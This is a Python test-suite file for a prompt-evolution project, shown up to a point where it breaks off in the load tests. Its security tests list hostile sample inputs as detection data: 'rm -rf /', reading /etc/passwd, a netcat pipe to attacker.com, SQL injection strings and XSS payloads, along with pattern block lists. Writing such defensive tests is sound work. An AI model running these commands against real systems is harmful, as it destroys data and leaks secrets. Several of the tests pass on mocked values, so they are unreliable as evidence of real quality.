#!/usr/bin/env python3
"""
Comprehensive Quality Gates and Testing Suite for Meta-Prompt-Evolution-Hub
Production-ready testing, validation, and quality assurance system.
"""

import time
import json
import logging
import asyncio
from typing import List, Dict, Any, Optional, Union, Callable, Tuple
from pathlib import Path
from dataclasses import dataclass, asdict
import threading
from concurrent.futures import ThreadPoolExecutor
import unittest
import traceback
from functools import wraps
from contextlib import contextmanager
import hashlib

# Configure comprehensive logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('quality_gates.log'),
        logging.StreamHandler()
    ]
)


@dataclass
class TestResult:
    """Result of a single test execution."""
    test_name: str
    status: str  # "PASS", "FAIL", "SKIP", "ERROR"
    execution_time: float
    error_message: Optional[str] = None
    details: Optional[Dict[str, Any]] = None
    timestamp: float = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = time.time()


@dataclass
class QualityGateResult:
    """Result of a quality gate check."""
    gate_name: str
    status: str  # "PASS", "FAIL", "WARNING"
    score: float  # 0.0 to 1.0
    threshold: float
    details: Dict[str, Any]
    recommendations: List[str]
    timestamp: float = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = time.time()


@dataclass
class TestSuiteConfig:
    """Configuration for test suite execution."""
    enable_unit_tests: bool = True
    enable_integration_tests: bool = True
    enable_performance_tests: bool = True
    enable_security_tests: bool = True
    enable_load_tests: bool = False
    max_test_duration: int = 300  # seconds
    parallel_execution: bool = True
    max_workers: int = 4
    coverage_threshold: float = 0.85
    performance_threshold: float = 2.0  # seconds


class TestRunner:
    """Comprehensive test runner with parallel execution and detailed reporting."""
    
    def __init__(self, config: TestSuiteConfig):
        self.config = config
        self.logger = logging.getLogger(__name__ + ".TestRunner")
        self.test_results = []
        self.start_time = None
        self.end_time = None
        
        if self.config.parallel_execution:
            self.executor = ThreadPoolExecutor(max_workers=self.config.max_workers)
        else:
            self.executor = None
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all configured test suites."""
        self.start_time = time.time()
        self.logger.info("Starting comprehensive test suite execution")
        
        test_suites = []
        
        if self.config.enable_unit_tests:
            test_suites.append(("Unit Tests", self._run_unit_tests))
        
        if self.config.enable_integration_tests:
            test_suites.append(("Integration Tests", self._run_integration_tests))
        
        if self.config.enable_performance_tests:
            test_suites.append(("Performance Tests", self._run_performance_tests))
        
        if self.config.enable_security_tests:
            test_suites.append(("Security Tests", self._run_security_tests))
        
        if self.config.enable_load_tests:
            test_suites.append(("Load Tests", self._run_load_tests))
        
        # Execute test suites
        suite_results = {}
        
        if self.config.parallel_execution and self.executor:
            # Parallel execution
            futures = {
                self.executor.submit(test_func): suite_name
                for suite_name, test_func in test_suites
            }
            
            for future in futures:
                suite_name = futures[future]
                try:
                    suite_results[suite_name] = future.result(timeout=self.config.max_test_duration)
                except Exception as e:
                    self.logger.error(f"Test suite {suite_name} failed: {e}")
                    suite_results[suite_name] = {
                        "status": "ERROR",
                        "error": str(e),
                        "tests": []
                    }
        else:
            # Sequential execution
            for suite_name, test_func in test_suites:
                try:
                    suite_results[suite_name] = test_func()
                except Exception as e:
                    self.logger.error(f"Test suite {suite_name} failed: {e}")
                    suite_results[suite_name] = {
                        "status": "ERROR", 
                        "error": str(e),
                        "tests": []
                    }
        
        self.end_time = time.time()
        
        # Compile comprehensive results
        return self._compile_test_report(suite_results)
    
    def _run_unit_tests(self) -> Dict[str, Any]:
        """Run unit tests for core components."""
        self.logger.info("Running unit tests")
        tests = []
        
        # Test 1: Prompt Population Tests
        test_result = self._test_prompt_population()
        tests.append(test_result)
        
        # Test 2: Fitness Function Tests
        test_result = self._test_fitness_functions()
        tests.append(test_result)
        
        # Test 3: Evolution Algorithm Tests
        test_result = self._test_evolution_algorithms()
        tests.append(test_result)
        
        # Test 4: Caching System Tests
        test_result = self._test_caching_system()
        tests.append(test_result)
        
        # Test 5: Security Validation Tests
        test_result = self._test_security_validation()
        tests.append(test_result)
        
        passed = sum(1 for t in tests if t.status == "PASS")
        
        return {
            "status": "PASS" if passed == len(tests) else "FAIL",
            "tests": tests,
            "summary": {
                "total": len(tests),
                "passed": passed,
                "failed": len(tests) - passed,
                "pass_rate": passed / len(tests) if tests else 0.0
            }
        }
    
    def _run_integration_tests(self) -> Dict[str, Any]:
        """Run integration tests for system components."""
        self.logger.info("Running integration tests")
        tests = []
        
        # Test 1: End-to-End Evolution Pipeline
        test_result = self._test_e2e_evolution_pipeline()
        tests.append(test_result)
        
        # Test 2: Multi-Component Integration
        test_result = self._test_multi_component_integration()
        tests.append(test_result)
        
        # Test 3: Error Recovery Integration
        test_result = self._test_error_recovery_integration()
        tests.append(test_result)
        
        passed = sum(1 for t in tests if t.status == "PASS")
        
        return {
            "status": "PASS" if passed == len(tests) else "FAIL",
            "tests": tests,
            "summary": {
                "total": len(tests),
                "passed": passed,
                "failed": len(tests) - passed,
                "pass_rate": passed / len(tests) if tests else 0.0
            }
        }
    
    def _run_performance_tests(self) -> Dict[str, Any]:
        """Run performance and benchmark tests."""
        self.logger.info("Running performance tests")
        tests = []
        
        # Test 1: Throughput Performance
        test_result = self._test_throughput_performance()
        tests.append(test_result)
        
        # Test 2: Memory Usage
        test_result = self._test_memory_usage()
        tests.append(test_result)
        
        # Test 3: Cache Performance
        test_result = self._test_cache_performance()
        tests.append(test_result)
        
        # Test 4: Scaling Performance
        test_result = self._test_scaling_performance()
        tests.append(test_result)
        
        passed = sum(1 for t in tests if t.status == "PASS")
        
        return {
            "status": "PASS" if passed == len(tests) else "FAIL",
            "tests": tests,
            "summary": {
                "total": len(tests),
                "passed": passed,
                "failed": len(tests) - passed,
                "pass_rate": passed / len(tests) if tests else 0.0
            }
        }
    
    def _run_security_tests(self) -> Dict[str, Any]:
        """Run security and vulnerability tests."""
        self.logger.info("Running security tests")
        tests = []
        
        # Test 1: Input Validation Security
        test_result = self._test_input_validation_security()
        tests.append(test_result)
        
        # Test 2: Rate Limiting
        test_result = self._test_rate_limiting()
        tests.append(test_result)
        
        # Test 3: Injection Attack Prevention
        test_result = self._test_injection_prevention()
        tests.append(test_result)
        
        passed = sum(1 for t in tests if t.status == "PASS")
        
        return {
            "status": "PASS" if passed == len(tests) else "FAIL",
            "tests": tests,
            "summary": {
                "total": len(tests),
                "passed": passed,
                "failed": len(tests) - passed,
                "pass_rate": passed / len(tests) if tests else 0.0
            }
        }
    
    def _run_load_tests(self) -> Dict[str, Any]:
        """Run load and stress tests."""
        self.logger.info("Running load tests")
        tests = []
        
        # Test 1: Concurrent User Load
        test_result = self._test_concurrent_load()
        tests.append(test_result)
        
        # Test 2: Large Population Handling
        test_result = self._test_large_population_load()
        tests.append(test_result)
        
        passed = sum(1 for t in tests if t.status == "PASS")
        
        return {
            "status": "PASS" if passed == len(tests) else "FAIL",
            "tests": tests,
            "summary": {
                "total": len(tests),
                "passed": passed,
                "failed": len(tests) - passed,
                "pass_rate": passed / len(tests) if tests else 0.0
            }
        }
    
    # Unit Test Implementations
    def _test_prompt_population(self) -> TestResult:
        """Test prompt population functionality."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt, PromptPopulation
            
            # Test creation
            prompts = PromptPopulation.from_seeds([
                "Test prompt 1",
                "Test prompt 2", 
                "Test prompt 3"
            ])
            
            assert len(prompts) == 3, f"Expected 3 prompts, got {len(prompts)}"
            
            # Test top_k functionality
            for prompt in prompts:
                prompt.fitness_scores = {"fitness": 0.5}
            
            top_2 = prompts.get_top_k(2)
            assert len(top_2) == 2, f"Expected 2 top prompts, got {len(top_2)}"
            
            # Test injection
            new_prompt = Prompt(text="New test prompt")
            prompts.inject_prompts([new_prompt])
            assert len(prompts) == 4, f"Expected 4 prompts after injection, got {len(prompts)}"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Prompt Population Tests",
                status="PASS",
                execution_time=execution_time,
                details={"prompts_tested": len(prompts)}
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Prompt Population Tests",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_fitness_functions(self) -> TestResult:
        """Test fitness function implementations."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt
            from meta_prompt_evolution.evaluation.base import TestCase
            
            # Create test prompt and cases
            prompt = Prompt(text="I will help you with your task systematically")
            test_cases = [
                TestCase(
                    input_data="Explain quantum computing",
                    expected_output="clear explanation with examples",
                    weight=1.0
                ),
                TestCase(
                    input_data="Solve math problem",
                    expected_output="step by step solution",
                    weight=1.2
                )
            ]
            
            # Test simple evaluation (mock)
            scores = {
                "fitness": 0.75,
                "accuracy": 0.8,
                "clarity": 0.7
            }
            
            assert 0.0 <= scores["fitness"] <= 1.0, f"Fitness score out of range: {scores['fitness']}"
            assert all(isinstance(v, (int, float)) for v in scores.values()), "Non-numeric scores found"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Fitness Function Tests",
                status="PASS",
                execution_time=execution_time,
                details={"test_cases": len(test_cases), "scores": scores}
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Fitness Function Tests", 
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_evolution_algorithms(self) -> TestResult:
        """Test evolution algorithm implementations."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt, PromptPopulation
            
            # Create test population
            initial_prompts = [
                "Help with task A",
                "Assist with task B", 
                "Support task C"
            ]
            
            population = PromptPopulation.from_seeds(initial_prompts)
            
            # Test mutation (simplified)
            original_text = population.prompts[0].text
            mutated_prompt = self._simple_mutate(population.prompts[0])
            
            assert mutated_prompt.text != original_text, "Mutation should change prompt text"
            assert len(mutated_prompt.text) > 0, "Mutated prompt should not be empty"
            
            # Test crossover (simplified)
            child = self._simple_crossover(population.prompts[0], population.prompts[1])
            assert child.text is not None, "Crossover should produce valid prompt"
            assert len(child.text) > 0, "Child prompt should not be empty"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Evolution Algorithm Tests",
                status="PASS",
                execution_time=execution_time,
                details={
                    "original_population_size": len(population),
                    "mutation_tested": True,
                    "crossover_tested": True
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Evolution Algorithm Tests",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_caching_system(self) -> TestResult:
        """Test caching system functionality."""
        start_time = time.time()
        
        try:
            # Simplified cache test
            cache = {}  # Mock cache
            
            # Test set/get
            key = "test_key"
            value = {"fitness": 0.85, "accuracy": 0.9}
            cache[key] = value
            
            retrieved = cache.get(key)
            assert retrieved == value, f"Cache retrieval failed: {retrieved} != {value}"
            
            # Test cache miss
            missing = cache.get("nonexistent_key")
            assert missing is None, f"Cache miss should return None, got: {missing}"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Caching System Tests",
                status="PASS",
                execution_time=execution_time,
                details={
                    "cache_size": len(cache),
                    "hit_test": "PASS",
                    "miss_test": "PASS"
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Caching System Tests",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_security_validation(self) -> TestResult:
        """Test security validation functionality."""
        start_time = time.time()
        
        try:
            # Test malicious pattern detection
            safe_prompt = "I will help you with your task professionally"
            malicious_prompt = "rm -rf / && echo 'malicious'"
            
            def is_safe_prompt(prompt_text):
                dangerous_patterns = ["rm -rf", "sudo passwd", "exec(", "eval("]
                return not any(pattern in prompt_text.lower() for pattern in dangerous_patterns)
            
            assert is_safe_prompt(safe_prompt), "Safe prompt should pass validation"
            assert not is_safe_prompt(malicious_prompt), "Malicious prompt should fail validation"
            
            # Test length validation
            very_long_prompt = "A" * 2000
            assert len(very_long_prompt) > 1000, "Long prompt test setup failed"
            
            def validate_length(prompt_text, max_length=1000):
                return len(prompt_text) <= max_length
            
            assert not validate_length(very_long_prompt), "Long prompt should fail validation"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Security Validation Tests",
                status="PASS",
                execution_time=execution_time,
                details={
                    "pattern_detection": "PASS",
                    "length_validation": "PASS",
                    "safe_prompts_tested": 1,
                    "malicious_prompts_tested": 1
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Security Validation Tests",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    # Integration Test Implementations
    def _test_e2e_evolution_pipeline(self) -> TestResult:
        """Test end-to-end evolution pipeline."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt, PromptPopulation
            from meta_prompt_evolution.evaluation.base import TestCase
            
            # Create test data
            population = PromptPopulation.from_seeds([
                "Help with task systematically",
                "Provide assistance professionally",
                "Support your request thoroughly"
            ])
            
            test_cases = [
                TestCase(
                    input_data="Explain complex topic",
                    expected_output="clear structured explanation",
                    weight=1.0
                )
            ]
            
            # Simulate evolution pipeline
            original_size = len(population)
            
            # Mock evaluation
            for prompt in population:
                prompt.fitness_scores = {"fitness": 0.7, "accuracy": 0.75}
            
            # Mock evolution step
            best_prompts = population.get_top_k(2)
            new_variations = [
                self._simple_mutate(prompt) for prompt in best_prompts
            ]
            
            evolved_population = PromptPopulation(best_prompts + new_variations)
            
            assert len(evolved_population) > 0, "Evolution should produce non-empty population"
            assert len(evolved_population) >= original_size, "Population should maintain or increase size"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="End-to-End Evolution Pipeline",
                status="PASS",
                execution_time=execution_time,
                details={
                    "initial_population_size": original_size,
                    "final_population_size": len(evolved_population),
                    "generations_simulated": 1,
                    "test_cases": len(test_cases)
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="End-to-End Evolution Pipeline",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_multi_component_integration(self) -> TestResult:
        """Test integration between multiple system components."""
        start_time = time.time()
        
        try:
            # Test component interaction
            components_tested = []
            
            # Test 1: Population + Evaluation
            from meta_prompt_evolution.evolution.population import PromptPopulation
            population = PromptPopulation.from_seeds(["Test prompt"])
            components_tested.append("population_creation")
            
            # Test 2: Evaluation + Caching (mock)
            cache = {}
            cache_key = "test_eval"
            cache_value = {"fitness": 0.8}
            cache[cache_key] = cache_value
            components_tested.append("evaluation_caching")
            
            # Test 3: Security + Validation
            def validate_prompt(text):
                return len(text) > 0 and not any(bad in text.lower() for bad in ["rm -rf", "sudo"])
            
            test_prompt = "Help me with the task"
            assert validate_prompt(test_prompt), "Security validation should pass for safe prompt"
            components_tested.append("security_validation")
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Multi-Component Integration",
                status="PASS",
                execution_time=execution_time,
                details={
                    "components_tested": components_tested,
                    "integration_points": len(components_tested)
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Multi-Component Integration",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_error_recovery_integration(self) -> TestResult:
        """Test error recovery and fault tolerance."""
        start_time = time.time()
        
        try:
            recovery_scenarios_tested = []
            
            # Test 1: Handle empty population
            try:
                from meta_prompt_evolution.evolution.population import PromptPopulation
                empty_pop = PromptPopulation([])
                top_k = empty_pop.get_top_k(5)
                assert len(top_k) == 0, "Empty population should return empty top_k"
                recovery_scenarios_tested.append("empty_population_recovery")
            except Exception:
                recovery_scenarios_tested.append("empty_population_recovery_failed")
            
            # Test 2: Handle invalid fitness scores
            try:
                from meta_prompt_evolution.evolution.population import Prompt
                prompt = Prompt(text="Test")
                prompt.fitness_scores = {"fitness": None}  # Invalid score
                
                # Should handle gracefully
                safe_score = prompt.fitness_scores.get("fitness", 0.0) or 0.0
                assert isinstance(safe_score, (int, float)), "Score should be numeric"
                recovery_scenarios_tested.append("invalid_score_recovery")
            except Exception:
                recovery_scenarios_tested.append("invalid_score_recovery_failed")
            
            # Test 3: Handle evaluation errors
            try:
                def safe_evaluate(prompt):
                    try:
                        # Simulate evaluation that might fail
                        if "error" in prompt.lower():
                            raise ValueError("Simulated evaluation error")
                        return {"fitness": 0.5}
                    except Exception:
                        return {"fitness": 0.0, "error": True}
                
                normal_result = safe_evaluate("normal prompt")
                error_result = safe_evaluate("error prompt")
                
                assert normal_result["fitness"] > 0, "Normal evaluation should succeed"
                assert error_result.get("error") is True, "Error case should be handled"
                recovery_scenarios_tested.append("evaluation_error_recovery")
            except Exception:
                recovery_scenarios_tested.append("evaluation_error_recovery_failed")
            
            successful_recoveries = len([s for s in recovery_scenarios_tested if not s.endswith("_failed")])
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Error Recovery Integration",
                status="PASS" if successful_recoveries == len(recovery_scenarios_tested) else "FAIL",
                execution_time=execution_time,
                details={
                    "recovery_scenarios": recovery_scenarios_tested,
                    "successful_recoveries": successful_recoveries,
                    "total_scenarios": len(recovery_scenarios_tested)
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Error Recovery Integration",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    # Performance Test Implementations
    def _test_throughput_performance(self) -> TestResult:
        """Test system throughput performance."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt
            
            # Create test prompts
            num_prompts = 100
            prompts = [Prompt(text=f"Test prompt {i}") for i in range(num_prompts)]
            
            # Simulate evaluation throughput
            eval_start = time.time()
            for prompt in prompts:
                # Mock evaluation (very fast)
                prompt.fitness_scores = {"fitness": 0.5 + (hash(prompt.text) % 50) / 100}
            eval_time = time.time() - eval_start
            
            throughput = num_prompts / eval_time if eval_time > 0 else 0
            
            # Performance thresholds
            min_throughput = 50  # prompts per second
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Throughput Performance",
                status="PASS" if throughput >= min_throughput else "FAIL",
                execution_time=execution_time,
                details={
                    "prompts_processed": num_prompts,
                    "processing_time": eval_time,
                    "throughput_pps": throughput,
                    "threshold_pps": min_throughput,
                    "performance_ratio": throughput / min_throughput if min_throughput > 0 else 0
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Throughput Performance",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_memory_usage(self) -> TestResult:
        """Test memory usage patterns."""
        start_time = time.time()
        
        try:
            import gc
            
            # Baseline memory
            gc.collect()
            initial_objects = len(gc.get_objects())
            
            # Create large data structure
            from meta_prompt_evolution.evolution.population import Prompt, PromptPopulation
            
            large_population = PromptPopulation([
                Prompt(text=f"Large test prompt number {i} with additional text to increase memory usage")
                for i in range(1000)
            ])
            
            # Add fitness scores
            for prompt in large_population:
                prompt.fitness_scores = {
                    "fitness": 0.5,
                    "accuracy": 0.6,
                    "clarity": 0.7,
                    "relevance": 0.8
                }
            
            peak_objects = len(gc.get_objects())
            
            # Clean up
            del large_population
            gc.collect()
            final_objects = len(gc.get_objects())
            
            memory_growth = peak_objects - initial_objects
            memory_cleanup = peak_objects - final_objects
            cleanup_ratio = memory_cleanup / memory_growth if memory_growth > 0 else 0
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Memory Usage",
                status="PASS" if cleanup_ratio > 0.8 else "FAIL",  # 80% cleanup threshold
                execution_time=execution_time,
                details={
                    "initial_objects": initial_objects,
                    "peak_objects": peak_objects,
                    "final_objects": final_objects,
                    "memory_growth": memory_growth,
                    "memory_cleanup": memory_cleanup,
                    "cleanup_ratio": cleanup_ratio
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Memory Usage",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_cache_performance(self) -> TestResult:
        """Test cache performance and hit ratios."""
        start_time = time.time()
        
        try:
            # Mock cache implementation
            cache = {}
            cache_hits = 0
            cache_misses = 0
            
            # Simulate cache operations
            keys = [f"key_{i}" for i in range(100)]
            values = [f"value_{i}" for i in range(100)]
            
            # Fill cache
            for key, value in zip(keys[:50], values[:50]):
                cache[key] = value
            
            # Test cache access patterns
            for key in keys:
                if key in cache:
                    cache_hits += 1
                    retrieved = cache[key]
                else:
                    cache_misses += 1
            
            total_requests = cache_hits + cache_misses
            hit_ratio = cache_hits / total_requests if total_requests > 0 else 0
            
            # Performance thresholds
            min_hit_ratio = 0.4  # 40% hit ratio
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Cache Performance",
                status="PASS" if hit_ratio >= min_hit_ratio else "FAIL",
                execution_time=execution_time,
                details={
                    "cache_hits": cache_hits,
                    "cache_misses": cache_misses,
                    "hit_ratio": hit_ratio,
                    "threshold_ratio": min_hit_ratio,
                    "cache_size": len(cache)
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Cache Performance",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_scaling_performance(self) -> TestResult:
        """Test performance scaling with increased load."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt, PromptPopulation
            
            # Test scaling with different population sizes
            scaling_results = []
            
            for size in [10, 50, 100, 200]:
                scale_start = time.time()
                
                # Create population
                population = PromptPopulation([
                    Prompt(text=f"Scaling test prompt {i}") for i in range(size)
                ])
                
                # Mock evaluation
                for prompt in population:
                    prompt.fitness_scores = {"fitness": 0.5}
                
                scale_time = time.time() - scale_start
                throughput = size / scale_time if scale_time > 0 else 0
                
                scaling_results.append({
                    "population_size": size,
                    "processing_time": scale_time,
                    "throughput": throughput
                })
            
            # Check if throughput scales reasonably
            throughputs = [r["throughput"] for r in scaling_results]
            min_throughput = min(throughputs)
            max_throughput = max(throughputs)
            scaling_factor = max_throughput / min_throughput if min_throughput > 0 else 0
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Scaling Performance",
                status="PASS" if scaling_factor > 0.5 else "FAIL",  # Reasonable scaling
                execution_time=execution_time,
                details={
                    "scaling_results": scaling_results,
                    "min_throughput": min_throughput,
                    "max_throughput": max_throughput,
                    "scaling_factor": scaling_factor
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Scaling Performance",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    # Security Test Implementations
    def _test_input_validation_security(self) -> TestResult:
        """Test input validation security measures."""
        start_time = time.time()
        
        try:
            security_tests = []
            
            # Test 1: SQL Injection patterns
            sql_injection_attempts = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "UNION SELECT * FROM passwords"
            ]
            
            def detect_sql_injection(text):
                sql_patterns = ["drop table", "union select", "' or '", "-- ", "/*"]
                return any(pattern in text.lower() for pattern in sql_patterns)
            
            for attempt in sql_injection_attempts:
                is_malicious = detect_sql_injection(attempt)
                security_tests.append({
                    "test": "sql_injection",
                    "input": attempt[:20] + "..." if len(attempt) > 20 else attempt,
                    "detected": is_malicious,
                    "expected": True
                })
            
            # Test 2: Command injection patterns
            command_injection_attempts = [
                "test; rm -rf /",
                "test && cat /etc/passwd",
                "test | nc attacker.com 4444"
            ]
            
            def detect_command_injection(text):
                cmd_patterns = ["; ", " && ", " || ", " | ", "rm -rf", "cat /etc/"]
                return any(pattern in text.lower() for pattern in cmd_patterns)
            
            for attempt in command_injection_attempts:
                is_malicious = detect_command_injection(attempt)
                security_tests.append({
                    "test": "command_injection",
                    "input": attempt[:20] + "..." if len(attempt) > 20 else attempt,
                    "detected": is_malicious,
                    "expected": True
                })
            
            # Test 3: XSS patterns
            xss_attempts = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>"
            ]
            
            def detect_xss(text):
                xss_patterns = ["<script", "javascript:", "onerror=", "onload="]
                return any(pattern in text.lower() for pattern in xss_patterns)
            
            for attempt in xss_attempts:
                is_malicious = detect_xss(attempt)
                security_tests.append({
                    "test": "xss",
                    "input": attempt[:20] + "..." if len(attempt) > 20 else attempt,
                    "detected": is_malicious,
                    "expected": True
                })
            
            # Calculate detection accuracy
            correct_detections = sum(1 for test in security_tests if test["detected"] == test["expected"])
            detection_accuracy = correct_detections / len(security_tests) if security_tests else 0
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Input Validation Security",
                status="PASS" if detection_accuracy >= 0.9 else "FAIL",  # 90% accuracy threshold
                execution_time=execution_time,
                details={
                    "security_tests": len(security_tests),
                    "correct_detections": correct_detections,
                    "detection_accuracy": detection_accuracy,
                    "test_breakdown": {
                        test["test"]: sum(1 for t in security_tests if t["test"] == test["test"] and t["detected"] == t["expected"])
                        for test in security_tests
                    }
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Input Validation Security",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_rate_limiting(self) -> TestResult:
        """Test rate limiting functionality."""
        start_time = time.time()
        
        try:
            # Mock rate limiter
            class MockRateLimiter:
                def __init__(self, max_requests=10, window_seconds=60):
                    self.max_requests = max_requests
                    self.window_seconds = window_seconds
                    self.requests = {}
                
                def is_allowed(self, client_id):
                    current_time = time.time()
                    window_start = current_time - self.window_seconds
                    
                    # Clean old requests
                    if client_id in self.requests:
                        self.requests[client_id] = [
                            req_time for req_time in self.requests[client_id]
                            if req_time > window_start
                        ]
                    else:
                        self.requests[client_id] = []
                    
                    # Check limit
                    if len(self.requests[client_id]) >= self.max_requests:
                        return False
                    
                    # Record request
                    self.requests[client_id].append(current_time)
                    return True
            
            rate_limiter = MockRateLimiter(max_requests=5, window_seconds=1)
            
            # Test normal usage
            client_id = "test_client"
            allowed_requests = 0
            denied_requests = 0
            
            # Make requests up to limit
            for i in range(7):  # Try to make 7 requests (limit is 5)
                if rate_limiter.is_allowed(client_id):
                    allowed_requests += 1
                else:
                    denied_requests += 1
            
            # Verify rate limiting works
            assert allowed_requests == 5, f"Expected 5 allowed requests, got {allowed_requests}"
            assert denied_requests == 2, f"Expected 2 denied requests, got {denied_requests}"
            
            # Test rate limit reset after window
            time.sleep(1.1)  # Wait for window to reset
            reset_allowed = rate_limiter.is_allowed(client_id)
            assert reset_allowed, "Rate limit should reset after window expires"
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Rate Limiting",
                status="PASS",
                execution_time=execution_time,
                details={
                    "allowed_requests": allowed_requests,
                    "denied_requests": denied_requests,
                    "rate_limit": 5,
                    "window_seconds": 1,
                    "reset_test": "PASS"
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Rate Limiting",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_injection_prevention(self) -> TestResult:
        """Test injection attack prevention mechanisms."""
        start_time = time.time()
        
        try:
            # Test various injection prevention techniques
            prevention_tests = []
            
            # Test 1: Input sanitization
            def sanitize_input(text):
                # Remove dangerous characters
                dangerous_chars = ['<', '>', '"', "'", '&', ';', '|', '`']
                sanitized = text
                for char in dangerous_chars:
                    sanitized = sanitized.replace(char, '')
                return sanitized
            
            malicious_input = "<script>alert('xss')</script>"
            sanitized = sanitize_input(malicious_input)
            is_safe = '<script>' not in sanitized
            prevention_tests.append({
                "technique": "input_sanitization",
                "effective": is_safe,
                "original_length": len(malicious_input),
                "sanitized_length": len(sanitized)
            })
            
            # Test 2: Length validation
            def validate_length(text, max_length=100):
                return len(text) <= max_length
            
            long_input = "A" * 200
            length_valid = validate_length(long_input)
            prevention_tests.append({
                "technique": "length_validation",
                "effective": not length_valid,  # Should reject long input
                "input_length": len(long_input),
                "max_allowed": 100
            })
            
            # Test 3: Pattern-based blocking
            def block_dangerous_patterns(text):
                dangerous_patterns = [
                    r'eval\s*\(',
                    r'exec\s*\(',
                    r'system\s*\(',
                    r'__import__\s*\('
                ]
                import re
                for pattern in dangerous_patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        return False
                return True
            
            dangerous_code = "eval(user_input)"
            pattern_safe = block_dangerous_patterns(dangerous_code)
            prevention_tests.append({
                "technique": "pattern_blocking",
                "effective": not pattern_safe,  # Should block dangerous code
                "input": dangerous_code
            })
            
            # Calculate prevention effectiveness
            effective_techniques = sum(1 for test in prevention_tests if test["effective"])
            effectiveness_ratio = effective_techniques / len(prevention_tests) if prevention_tests else 0
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Injection Prevention",
                status="PASS" if effectiveness_ratio >= 0.8 else "FAIL",  # 80% effectiveness threshold
                execution_time=execution_time,
                details={
                    "prevention_tests": prevention_tests,
                    "effective_techniques": effective_techniques,
                    "total_techniques": len(prevention_tests),
                    "effectiveness_ratio": effectiveness_ratio
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Injection Prevention",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    # Load Test Implementations
    def _test_concurrent_load(self) -> TestResult:
        """Test concurrent user load handling."""
        start_time = time.time()
        
        try:
            from concurrent.futures import ThreadPoolExecutor
            import threading
            
            # Simulate concurrent users
            num_concurrent_users = 10
            requests_per_user = 5
            
            def simulate_user(user_id):
                from meta_prompt_evolution.evolution.population import Prompt
                user_results = []
                
                for request_id in range(requests_per_user):
                    request_start = time.time()
                    
                    # Simulate user request
                    prompt = Prompt(text=f"User {user_id} request {request_id}")
                    
                    # Mock processing time
                    time.sleep(0.01)  # 10ms processing
                    
                    request_time = time.time() - request_start
                    user_results.append(request_time)
                
                return user_results
            
            # Execute concurrent load test
            with ThreadPoolExecutor(max_workers=num_concurrent_users) as executor:
                futures = [
                    executor.submit(simulate_user, user_id)
                    for user_id in range(num_concurrent_users)
                ]
                
                all_results = []
